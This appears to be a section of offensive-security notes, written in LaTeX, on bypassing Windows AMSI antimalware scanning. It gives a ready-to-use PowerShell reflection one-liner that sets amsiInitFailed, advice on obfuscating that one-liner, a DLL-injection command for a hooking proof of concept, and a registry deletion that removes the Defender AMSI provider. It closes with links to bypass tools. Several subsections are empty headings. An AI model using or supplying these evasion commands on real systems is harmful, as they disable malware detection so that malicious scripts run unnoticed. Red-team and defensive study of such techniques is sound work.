\section{AMSI bypass}

\verb+System.Management.Automation.AmsiUtils+ 

the \verb+System.Management.Automation.dll+ is located inside:
\begin{verbatim}
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35
\end{verbatim}

and can be loaded with \verb+dnspy+

Inspecting the \verb+AmsiScanBuffer+ function which scans a memory buffer for malware. Many applications and services leverage this function. Within the .NET framework, the Common Language Runtime (CLR) leverages the \verb+ScanContent+ function in the \verb+AmsiUtils+ Class inside \verb+System.Management.Automation.dll+, which is part of PowerShell’s core libraries and leads to the \verb+AmsiScanBuffer+ call.

\subsection{String manipulation}

\subsection{Hooking}

Tom Carver created a proof of concept in the form of a DLL file which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters. The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed.

\begin{verbatim}
SimpleInjector.exe powershell.exe .\AmsiHook.dll
\end{verbatim}

\subsection{Memory Patching}

\subsubsection{amsiInitFailed}

When Analysing the \verb+ScanContent+ method of \verb+AmsiUtils+:

\begin{verbatim}
if (string.IsNullOrEmpty(sourceMetadata))
{
	sourceMetadata = string.Empty;
}
if (InternalTestHooks.UseDebugAmsiImplementation && content.IndexOf("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", StringComparison.Ordinal) >= 0)
{
	return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED;
}
if (AmsiUtils.amsiInitFailed)
{
	return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
\end{verbatim}

sets \verb+amsiInitFailed+ to \verb+true+ so that the method \verb+ScanContent+ will always return \verb+AMSI_RESULT_NOT_DETECTED+.
\begin{verbatim}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,!$false)
\end{verbatim}

after Need to perform obfuscation of the command :
\begin{itemize}
    \item \verb+true+ can be replaced with \verb+!$false+
    \item use string concat \verb-'amsiInit'+'Failed'-
\end{itemize}

\subsubsection{}
Bypassing ASMI using memory patching will allow us to run malicious scripts in PowerShell after the patch and not be detected by AV in the same powershell.exe session

Remember that \verb+AmsiScanString+ uses \verb+AmsiScanBuffer+ underneath.

The basics of the bypass vulnerability is this:
\begin{enumerate}
    \item 
        Load amsi.dll (which happens automatically when PowerShell session is opened)
    \item 
        Patch the \verb+AmsiScanBuffer()+ function so that it always returns \verb+AMSI_RESULT_CLEAN+. This allows for any commands in the PowerShell session to execute without AMSI blocking it.
\end{enumerate}


\subsection{Forcing an Error}

\subsection{Registry Key Modification}
AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. The GUID for Windows Defender is displayed below:
\begin{verbatim}
HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
\end{verbatim}

Removing the registry key of the AMSI provider will disable the ability of windows defender to perform AMSI inspection and evade the control. However, deleting a registry key is not considered a stealthy approach (if there is sufficient monitoring in place) and also requires elevated rights.

\begin{verbatim}
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
\end{verbatim}

\subsection{DLL Hijacking}

\subsection{Tools}
\begin{itemize}
    \item 
        \url{https://github.com/rasta-mouse/AmsiScanBufferBypass}
    \item 
        \url{https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998}
    \item 
        \url{https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628}
    \item 
        \url{https://gist.github.com/am0nsec/854a6662f9df165789c8ed2b556e9597}
    \item 
        \url{https://github.com/med0x2e/NoAmci}
    \item 
        \url{https://github.com/tomcarver16/AmsiHook}
\end{itemize}

\subsection{Links}

\begin{itemize}
    \item 
        \href{https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell}{S3cur3Th1sSh1t/Amsi-Bypass-Powershell}
\end{itemize}
